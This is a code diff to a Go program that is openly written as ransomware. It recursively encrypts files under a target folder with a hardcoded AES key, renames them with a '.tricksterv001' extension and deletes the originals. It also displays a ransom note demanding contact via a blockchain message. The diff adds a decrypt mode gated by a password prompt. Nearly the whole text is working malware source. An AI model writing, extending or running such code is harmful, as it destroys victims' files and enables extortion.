@@ -4,17 +4,23 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
+	"flag"
 	"fmt"
 	"io"
+	"strings"
 
 	"io/fs"
 	"io/ioutil"
 	"log"
 	"os"
+
+	"golang.org/x/crypto/ssh/terminal"
 )
 
+const KeyStr string = "jdksieu38eueirktldoeiru38fjdlek3"
+
 func AESEncrypt(text []byte) []byte {
-	key := []byte("jdksieu38eueirktldoeiru38fjdlek3")
+	key := []byte(KeyStr)
 
 	// generate a new aes cipher using our 32 byte long key
 	c, err := aes.NewCipher(key)
@@ -51,7 +57,7 @@ func AESEncrypt(text []byte) []byte {
 }
 
 func AESDecrypt(ciphertext []byte) []byte {
-	key := []byte("jdksieu38eueirktldoeiru38fjdlek3")
+	key := []byte(KeyStr)
 
 	c, err := aes.NewCipher(key)
 	if err != nil {
@@ -91,7 +97,12 @@ func TestEncryptDecrypt() {
 	fmt.Println("[Decrypted]", string(decrypted))
 }
 
-func RecursiveEncrypt(index []int, dir string, file fs.FileInfo) {
+func RecursiveEncrypt(
+	index []int,
+	dir string,
+	file fs.FileInfo,
+	decrypt bool,
+) {
 	for i := 0; i < len(index); i++ {
 		fmt.Print("_")
 	}
@@ -111,44 +122,106 @@ func RecursiveEncrypt(index []int, dir string, file fs.FileInfo) {
 			newIndex := index
 			newIndex = append(newIndex, i+1)
 
-			RecursiveEncrypt(newIndex, dir+"/"+dirName, file)
+			RecursiveEncrypt(newIndex, dir+"/"+dirName, file, decrypt)
 		}
 
 		return
 	}
 
-	for i := 0; i < len(index); i++ {
-		fmt.Print("_")
-	}
-	fmt.Println("[FILE]", dir+"/"+file.Name())
+	// Check if encrypt/decrypt
 
-	// Read file bytes
-	fBytes, err := ioutil.ReadFile(dir + "/" + file.Name())
-
-	if err != nil {
+	// Encryption process
+	if !decrypt {
 		for i := 0; i < len(index); i++ {
 			fmt.Print("_")
 		}
-		fmt.Println("Error reading "+dir+"/"+file.Name(), ": ", err)
+		fmt.Println("[ENCRYPT FILE]", dir+"/"+file.Name())
+
+		// Read file bytes
+		fBytes, err := ioutil.ReadFile(dir + "/" + file.Name())
+
+		if err != nil {
+			for i := 0; i < len(index); i++ {
+				fmt.Print("_")
+			}
+			fmt.Println("Error reading "+dir+"/"+file.Name(), ": ", err)
+		}
+
+		encryptedFileName := dir + "/" + file.Name() + ".tricksterv001"
+
+		for i := 0; i < len(index); i++ {
+			fmt.Print("_")
+		}
+		fmt.Println("Encrypted: " + encryptedFileName)
+
+		ioutil.WriteFile(encryptedFileName, AESEncrypt(fBytes), 0644)
+
+		// Delete original file
+		os.Remove(dir + "/" + file.Name())
+
+		// Decription process
+	} else {
+		for i := 0; i < len(index); i++ {
+			fmt.Print("_")
+		}
+		fmt.Println("[DECRYPT FILE]", dir+"/"+file.Name())
+
+		if !strings.Contains(file.Name(), ".tricksterv001") {
+			fmt.Println("Failed to decrypt! file extension is not .tricksterv001")
+		} else {
+			// Read file bytes
+			fBytes, err := ioutil.ReadFile(dir + "/" + file.Name())
+
+			if err != nil {
+				for i := 0; i < len(index); i++ {
+					fmt.Print("_")
+				}
+				fmt.Println("Error reading "+dir+"/"+file.Name(), ": ", err)
+			}
+
+			originalFilename := strings.Split(file.Name(), ".tricksterv001")
+
+			decryptedFileName := dir + "/" + originalFilename[0]
+
+			for i := 0; i < len(index); i++ {
+				fmt.Print("_")
+			}
+			fmt.Println("Decrypted: " + decryptedFileName)
+
+			ioutil.WriteFile(decryptedFileName, AESDecrypt(fBytes), 0644)
+
+			// Delete original file
+			os.Remove(dir + "/" + file.Name())
+		}
 	}
-
-	encryptedFileName := dir + "/" + file.Name() + ".tricksterv001"
-
-	for i := 0; i < len(index); i++ {
-		fmt.Print("_")
-	}
-	fmt.Println("Encrypted: " + encryptedFileName)
-
-	ioutil.WriteFile(encryptedFileName, AESEncrypt(fBytes), 0644)
-
-	// Delete original file
-	os.Remove(dir + "/" + file.Name())
 
 	fmt.Println()
 }
 
 func main() {
-	TestEncryptDecrypt()
+	decryptFlag := flag.Bool("decrypt", false, "Define if type is decrypt")
+
+	flag.Parse()
+
+	// fmt.Println("Type:", *decryptFlag)
+
+	decryptPassword := ""
+
+	if *decryptFlag {
+		fmt.Println("Please enter password:")
+
+		pass, err := terminal.ReadPassword(0)
+
+		if err != nil {
+			fmt.Println("Failed reading password.")
+		}
+
+		decryptPassword = string(pass)
+	}
+
+	fmt.Println("pwd", decryptPassword)
+
+	// TestEncryptDecrypt()
 
 	test := `YOUR FILES HAVE BEEN ENCRYPTED!!
 =========================================
@@ -163,11 +236,12 @@ attach your email to the blockchain message, and we will contact you soon.
 
 And then we will send the procedures to retrieve your files back.`
 
+	fmt.Println("\nMessage:\n")
 	fmt.Println(test)
 
 	fmt.Println()
 
-	fmt.Println("[FILES TO ENCRYPT]")
+	fmt.Println("[FILES TO EN/DECRYPT]")
 
 	dir := "./toencrypt"
 
@@ -177,8 +251,13 @@ And then we will send the procedures to retrieve your files back.`
 		log.Fatal(err)
 	}
 
+	if *decryptFlag && KeyStr != decryptPassword {
+		fmt.Println("Passwords do not match. Decrypt failed.")
+		return
+	}
+
 	for i, file := range files {
-		RecursiveEncrypt([]int{i + 1}, dir, file)
+		RecursiveEncrypt([]int{i + 1}, dir, file, *decryptFlag)
 	}
 
 	homeDir, _ := os.UserHomeDir()
